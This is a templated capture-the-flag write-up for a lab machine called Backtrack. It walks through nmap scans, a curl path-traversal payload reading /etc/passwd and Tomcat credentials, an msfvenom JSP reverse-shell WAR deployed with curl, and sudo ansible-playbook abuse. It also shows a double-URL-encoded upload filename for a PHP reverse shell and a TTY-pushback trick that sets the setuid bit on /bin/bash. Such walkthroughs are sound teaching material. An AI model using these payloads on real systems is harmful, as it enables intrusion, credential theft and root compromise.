{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin with an <strong>Nmap</strong> scan to identify open ports.")}}

{{console("nmap -T5 -p- 10.10.156.56", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 14:01 EST
Warning: 10.10.156.56 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.156.56
Host is up (0.098s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
6800/tcp  open     unknown
8080/tcp  open     http-proxy
8888/tcp  open     sun-answerbook")}}

{{text("We find 4 open ports:")}}

{{list(['22 (SSH)', '6800 (Unknown)', '8080 (HTTP)', '8888 (Sun-Answerbook)'])}}

{{text("We should investigate these ports further.")}}

{{console('nmap -sC -sV -p 22,6800,8080,8888 10.10.156.56', "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 14:10 EST
Nmap scan report for 10.10.156.56
Host is up (0.071s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
6800/tcp open  http            aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
|   GetRequest: 
|     HTTP/1.1 200 OK
...")}}

{{text("We notice the name <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>aria2</code>. After a quick search, we discover that it is a file downloading tool.")}}

{{text("Visiting the page on port 8888, we find the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>aria2</code> web application.")}}

{{image("../../static/writeups/backtrack/images/000001.jpg")}}

{{text("By checking the server info in the settings tab, we discover that the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>aria2</code> version is 1.35.0.")}}

{{header("Shell as tomcat", "shell-as-tomcat")}}

{{text("While searching for a vulnerability in this version, we come across the following.")}}

{{link("https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e", "../../static/writeups/images/github.jpg", "webui-aria2 CVE-2023-39141")}}

{{text("It is a path traversal vulnerability that allows us to read files outside the serving path.")}}

{{text("Let's try the payload provided.")}}

{{console("curl --path-as-is http://10.10.156.56:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd", "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
...")}}

{{text("The payload works, and we are able to view the users on the server. We notice the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tomcat</code> user with a home directory at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt/tomcat</code>. Tomcat users are typically stored in an XML file, so if we can find it, we should obtain our first set of credentials.")}}

{{text("Searching for the location of the Tomcat users' XML file, we learn that it should be located at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/conf/tomcat-users.xml</code>. Let's try to read this file.")}}

{{console("curl --path-as-is http://10.10.156.56:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml", "<?xml version='1.0' encoding='UTF-8'?>
<tomcat-users xmlns='http://tomcat.apache.org/xml'
              xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
              xsi:schemaLocation='http://tomcat.apache.org/xml tomcat-users.xsd'
              version='1.0'>

  <role rolename='manager-script'/>
  <user username='tomcat' password='[REDACTED]' roles='manager-script'/> 

</tomcat-users>")}}

{{text("Now, let's switch to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tomcat</code> server at port 8080 and log in with our credentials by accessing the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Manager App</code>.")}}

{{image("../../static/writeups/backtrack/images/000002.jpg")}}

{{text("Unfortunately, we lack the necessary permissions to access the GUI due to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>manager-script</code> role.")}}

{{text("However, we do have some permissions, so I searched for ways to exploit this role and found the following article.")}}

{{link("https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00", "https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19", "Exploiting Apache Tomcat manager-script role")}}

{{text("Let's use <strong>msfvenom</strong> to generate a payload with a reverse shell.")}}

{{console("msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.4.147 LPORT=4445 -f war -o shell.war", "Payload size: 1101 bytes
Final size of war file: 1101 bytes
Saved as: shell.war")}}

{{text("Now, we should be able to upload it to the web server.")}}

{{console("curl -v -u tomcat:[REDACTED] --upload-file pwn.war 'http://10.10.156.56:8080/manager/text/deploy?path=/foo&update=true'", "Trying 10.10.156.56:8080...
* Connected to 10.10.156.56 (10.10.156.56) port 8080
* using HTTP/1.x
* Server auth using Basic with user 'tomcat'
> PUT /manager/text/deploy?path=/foo&update=true HTTP/1.1
> Host: 10.10.156.56:8080
> Authorization: Basic dG9tY2F0Ok9QeDUyazUzRDhPa1RacHg0ZnI=
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Length: 1101
> 
* upload completely sent off: 1101 bytes
...")}}

{{text("After setting up a listener and navigating to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://10.10.156.56:8080/foo</code>, we should receive a reverse shell.")}}

{{text("After setting up a listener, and going to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://10.10.156.56:8080/foo</code>, we should get back a reverse shell.")}}

{{text("Going to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt/tomcat</code> allows us to view our first flag.")}}

{{image("../../static/writeups/backtrack/images/000003.jpg")}}

{{header("Shell as wilbur", "shell-as-wilbur")}}

{{text("While looking for privilege escalation vectors, we discover this.")}}

{{console("sudo -l", "Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml")}}

{{text("We are able to run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ansible-playbook</code> on all <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>yml</code> files inside <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt/test_playbooks</code> as user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wilbur</code>.")}}

{{text("We find how to exploit <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ansible-playbook</code> sudo privileges.")}}

{{link("https://gtfobins.github.io/gtfobins/ansible-playbook/", "https://gtfobins.github.io/assets/logo.png", "ansible-playbook")}}

{{image("../../static/writeups/backtrack/images/000004.jpg")}}

{{text("We are now the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wilbur</code>.")}}

{{header("Shell as orville", "shell-as-orville")}}

{{text("While navigating the files, we find a note from another user in our home directory.")}}

{{image("../../static/writeups/backtrack/images/000005.jpg")}}

{{text("We should try to look for the app mentioned in the note.")}}

{{console("netstat -tulnp", "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -  
...")}}

{{text("Because our home directory also contained SSH credentials, we can use those to access the site on port 80.")}}

{{console("ssh -L 80:127.0.0.1:80 wilbur@10.10.156.56", "wilbur@10.10.156.56's password: 
...")}}

{{text("We now can go to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://127.0.0.1:80</code> on our local machine.")}}

{{image("../../static/writeups/backtrack/images/000006.jpg")}}

{{text("We discover an image gallery app, and we can use the credentials we found in the note to log in.")}}

{{text("We are able to upload writeups, but not <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>php</code> files. After testing, I discovered that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>shell.png.php</code> goes through, but the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>php</code> file still doesn't get executed.")}}

{{text("This was definitely the most confusing part of the room. What we had to do is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>double URL encode '../'</code> and our reverse shell should work.")}}

{{text("I used a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP PentestMonkey</code> reverse shell from <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code>, named my file <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>%252e%252e%252fshell.png.php</code>, set up a listener, and uploaded the file.")}}

{{text("The reverse shell runs successfully, and we get access to user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>orville</code>.")}}

{{text("We are able to find the second flag in our user home directory.")}}

{{image("../../static/writeups/backtrack/images/000008.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("While looking for ways to exploit the machine, I downloaded <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pspy64</code> using a Python server and wget to see if any commands get run in the background.")}}

{{image("../../static/writeups/backtrack/images/000009.jpg")}}

{{text("Root switches user to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>orville</code> and runs a couple of commands as him.")}}

{{text("I searched on how to get back to being root after switching users and I stumbled upon this article.")}}

{{link("https://www.errno.fr/TTYPushback.html", "null", "The oldest privesc: injecting careless administrators' terminals using TTY pushback")}}

{{text("We modify the Python code to add a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>s bit</code> to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/bin/bash</code> in order to get root privileges.")}}

{{text("We create a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.py</code> file with the following code.")}}

{{image("../../static/writeups/backtrack/images/000010.jpg")}}

{{text("Now when we run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>echo root.py >> .bashrc</code> and wait a while, we should be able to run bash as root and get our final flag.")}}

{{script()}}
